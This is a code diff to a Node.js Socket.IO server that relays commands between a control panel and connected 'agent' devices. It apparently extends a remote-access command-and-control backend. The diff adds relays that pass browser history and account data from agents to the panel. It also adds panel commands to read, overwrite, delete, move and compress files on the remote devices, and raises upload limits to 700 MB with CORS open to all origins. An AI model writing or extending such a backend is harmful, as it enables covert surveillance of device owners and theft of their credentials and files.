@@ -10,7 +10,7 @@ const { initDB, prepare, saveDB } = require('./db');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 50e6 });
+const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 700e6 });
 
 const PORT = process.env.PORT || 3000;
 
@@ -22,7 +22,7 @@ fs.mkdirSync(screenshotsDir, { recursive: true });
 
 // Middleware
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '700mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(uploadsDir));
 app.use('/screenshots', express.static(screenshotsDir));
@@ -186,6 +186,27 @@ function handleAgentConnection(socket, agentSockets, panelSockets, screenStreams
     for (const [, p] of panelSockets) p.socket.emit('ls-result', { deviceId, ...data });
   });
 
+  socket.on('preview-result', (data) => {
+    for (const [, p] of panelSockets) p.socket.emit('preview-result', { deviceId, ...data });
+  });
+
+  socket.on('file-content', (data) => {
+    for (const [, p] of panelSockets) p.socket.emit('file-content', { deviceId, ...data });
+  });
+
+  socket.on('processes-detailed', (data) => {
+    for (const [, p] of panelSockets) p.socket.emit('processes-detailed', { deviceId, ...data });
+  });
+
+  socket.on('browser-history', (data) => {
+        console.log('[HISTORY] Browser history from', socket.deviceId);
+        io.to('panel').emit('browser-history', data);
+      });
+
+      socket.on('accounts-data', (data) => {
+    for (const [, p] of panelSockets) p.socket.emit('accounts-data', { deviceId, ...data });
+  });
+
   socket.on('disconnect', () => {
     if (deviceId) {
       prepare("UPDATE devices SET is_online=0, last_seen=datetime('now') WHERE id=?").run(deviceId);
@@ -248,6 +269,15 @@ function handlePanelConnection(socket, agentSockets, panelSockets, screenStreams
   socket.on('request-ls', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('list-directory', { path: data.path }); });
   socket.on('request-processes', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('get-processes'); });
   socket.on('remote-input', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('remote-input', data); });
+  socket.on('preview-file', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('preview-file', data); });
+  socket.on('read-file-content', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('read-file-content', data); });
+  socket.on('save-file-content', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('save-file-content', data); });
+  socket.on('delete-file', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('delete-file', data); });
+  socket.on('create-folder', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('create-folder', data); });
+  socket.on('rename-file', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('rename-file', data); });
+  socket.on('copy-files', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('copy-files', data); });
+  socket.on('move-files', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('move-files', data); });
+  socket.on('compress-files', (data) => { const a = getAgent(data.deviceId); if (a) a.emit('compress-files', data); });
 
   socket.on('disconnect', () => {
     for (const [deviceId, watchers] of screenStreams) {
